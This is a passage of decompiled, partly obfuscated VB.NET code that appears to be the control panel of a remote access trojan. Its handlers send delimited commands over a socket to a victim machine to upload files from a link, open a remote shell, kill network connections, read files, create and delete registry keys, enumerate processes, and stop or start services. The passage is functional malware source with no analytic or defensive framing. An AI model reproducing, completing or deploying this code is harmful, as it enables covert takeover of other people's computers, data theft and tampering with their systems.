    Private Sub UploadFromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFromLinkToolStripMenuItem.Click
        If (Me.TextBox1.Text <> String.Empty) Then
            Dim link As New FromLink
            link.ShowDialog(Me)
            If link.IsOK Then
                Dim strArray As String() = New String(9 - 1) {}
                strArray(0) = "Ex"
                strArray(1) = Class7.string_1
                strArray(2) = "fm"
                strArray(3) = Class7.string_1
                strArray(4) = "fl"
                strArray(5) = Class7.string_1
                Dim box As TextBox = link.TextBox1
                Dim text As String = box.Text
                box.Text = [text]
                strArray(6) = Class6.smethod_14([text])
                strArray(7) = Class7.string_1
                strArray(8) = Class6.smethod_14((Me.TextBox1.Text & link.TextBox2.Text))
                Me.sk.Send(String.Concat(strArray))
            End If
        End If
    End Sub

    Private Sub RGk_NodeMouseClick(sender As Object, e As TreeNodeMouseClickEventArgs) Handles RGk.NodeMouseDoubleClick
        If (e.Button = MouseButtons.Left) Then
            If e.Node.IsExpanded Then
                e.Node.Collapse()
            Else
                e.Node.Expand()
            End If
        End If
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        Try
            If (Me.ListView1.SelectedItems.Count <> 0) Then
                Me.cur = DirectCast(Me.ListView1.SelectedIndices.Item(0), CR)
                Select Case Me.cur
                    Case CR.fm
                        Me.FMM.BringToFront()
                        Me.LPR.SendToBack()
                        Me.LTCP.SendToBack()
                        Me.RG.SendToBack()
                        Me.RG.SendToBack()
                        Me.sh.SendToBack()
                        Me.LSRV.SendToBack()
                        Me.L2.method_3()
                        Exit Select
                    Case CR.PR
                        Me.LPR.BringToFront()
                        Me.LPR.method_3()
                        Exit Select
                    Case CR.tcp
                        Me.LTCP.BringToFront()
                        Me.LTCP.method_3()
                        Exit Select
                    Case CR.reg
                        Me.RG.BringToFront()
                        Exit Select
                    Case CR.shl
                        Me.sh.BringToFront()
                        If (Me.shStarted = 0) Then
                            Me.shStarted = 1
                            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "rs", Class7.string_1, "~"}))
                        End If
                        Exit Select
                    Case CR.srv
                        Me.LSRV.BringToFront()
                        Me.LSRV.method_3()
                        Exit Select
                End Select
                Me.Icon = Icon.FromHandle(DirectCast(Me.vmethod_148.Images.Item(Me.ListView1.SelectedItems.Item(0).ImageIndex), Bitmap).GetHicon)
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub KillConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillConnectionToolStripMenuItem.Click
        Dim s As String = String.Concat(New String() {"Ex", Class7.string_1, "tcp", Class7.string_1, "!"})
        If (Me.LTCP.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = Me.LTCP.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    s = (s & Class7.string_1 & current.Tag.ToString)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem3.Click
        Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "~"}))
    End Sub

    Private Sub CreateKeyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateKeyToolStripMenuItem.Click
        If ((Not Me.RGk.SelectedNode Is Nothing) AndAlso Me.RGk.SelectedNode.FullPath.Contains("\")) Then
            Dim str As String = Interaction.InputBox("Key Name?", "Create New Key", "Name", -1, -1)
            If (str.Length <> 0) Then
                Me.RGk.Enabled = False
                Me.RGLIST.Enabled = False
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "#", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\", Class7.string_1, str}))
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\"}))
            End If
        End If
    End Sub

    Private Sub DeleteSelectedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteSelectedToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Dim fullPath As String = Me.RGk.SelectedNode.FullPath
            If fullPath.Contains("\") Then
                Dim str2 As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)((Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1))
                Dim str3 As String = String.Empty
                Dim num2 As Integer = (Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str3 = (str3 & Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) & "\")
                    i += 1
                Loop
                Me.RGk.Enabled = False
                Me.RGLIST.Enabled = False
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "$", Class7.string_1, str3, Class7.string_1, str2}))
                Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, str2, "\"}))
            End If
        End If
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        If (Me.LSRV.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim str As String = String.Empty
            Try
                enumerator = Me.LSRV.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    str = (str & Class7.string_1 & current.Text)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "srv", Class7.string_1, "!", str}))
        End If
    End Sub

    Private Sub PauseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PauseToolStripMenuItem.Click
        If (Me.LSRV.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim str As String = String.Empty
            Try
                enumerator = Me.LSRV.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    str = (str & Class7.string_1 & current.Text)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "srv", Class7.string_1, "@", str}))
        End If
    End Sub

    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        If (Me.LSRV.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Dim str As String = String.Empty
            Try
                enumerator = Me.LSRV.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    str = (str & Class7.string_1 & current.Text)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "srv", Class7.string_1, "#", str}))
        End If
    End Sub

    Private Sub EditToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles EditToolStripMenuItem1.Click
        If (Me.L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator
            Dim s As String = String.Concat(New String() {"Ex", Class7.string_1, "fm", Class7.string_1, "rd"})
            Try
                enumerator = Me.L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.SubItems.Item(2).Text <> "DIR") Then
                        Dim item2 As ListViewItem = current
                        Dim toolTipText As String = item2.ToolTipText
                        item2.ToolTipText = toolTipText
                        s = (s & Class7.string_1 & Class6.smethod_14(toolTipText))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            Me.sk.Send(s)
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Me.RGk.Enabled = False
            Me.RGLIST.Enabled = False
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\"}))
        End If
    End Sub

    Private Sub vmethod_26_Tick(sender As Object, e As EventArgs) Handles vmethod_26.Tick
        Me.vmethod_26.Enabled = False
        If (Me.sk Is Nothing) Then
            Me.Close()
            Return
        End If
        If Not Me.sk.CN Then
            Me.Close()
            Return
        End If
        Try
            Dim enumerator As IEnumerator
            Dim str As String
            Dim item As ListViewItem
            Select Case Me.cur
                Case CR.PR
                    Me.vmethod_26.Interval = &H7D0
                    If Not Me.PRNXT Then
                        GoTo Label_0267
                    End If
                    enumerator = Me.LPR.Items.GetEnumerator
                    str = String.Empty
                    GoTo Label_00B8
                Case CR.tcp
                    Me.vmethod_26.Interval = &H7D0
                    If Me.TCPNXT Then
                        Dim enumerator2 As IEnumerator
                        Dim s As String = String.Concat(New String() {"Ex", Class7.string_1, "tcp", Class7.string_1, "~", Class7.string_1})
                        Try
                            enumerator2 = Me.LTCP.Items.GetEnumerator
                            Do While enumerator2.MoveNext
                                Dim current As ListViewItem = DirectCast(enumerator2.Current, ListViewItem)
                                s = (s & current.Tag.ToString & Class7.string_1)
                            Loop
                        Finally
                            If TypeOf enumerator2 Is IDisposable Then
                                TryCast(enumerator2, IDisposable).Dispose()
                            End If
                        End Try
                        Me.sk.Send(s)
                        Me.TCPNXT = False
                    End If
                    GoTo Label_0267
                Case CR.srv
                    Me.vmethod_26.Interval = &HFA0
                    If Me.srvNxt Then
                        Dim str3 As String = String.Concat(New String() {"Ex", Class7.string_1, "srv", Class7.string_1, "~"})
                        Me.sk.Send(str3)
                        Me.srvNxt = False
                    End If
                    GoTo Label_0267
                Case Else
                    GoTo Label_0267
            End Select
Label_0089:
            item = DirectCast(enumerator.Current, ListViewItem)
            If (Not item Is Nothing) Then
                str = (str & Class7.string_1 & item.SubItems.Item(1).Text)
            End If
Label_00B8:
            If enumerator.MoveNext Then
                GoTo Label_0089
            End If
            Me.sk.Send(String.Concat(New String() {"Ex", Class7.string_1, "proc", Class7.string_1, "U", str}))
            Me.PRNXT = False
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
Label_0267:
        Me.vmethod_26.Enabled = True
    End Sub

    Private Sub L1_DoubleClick1(sender As Object, e As EventArgs) Handles L1.DoubleClick
        If (Me.L1.SelectedItems.Count <> 0) Then
            Me.exp(Me.L1.SelectedItems.Item(0).ToolTipText, False)
        End If
    End Sub

    
    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs)

    End Sub
End Class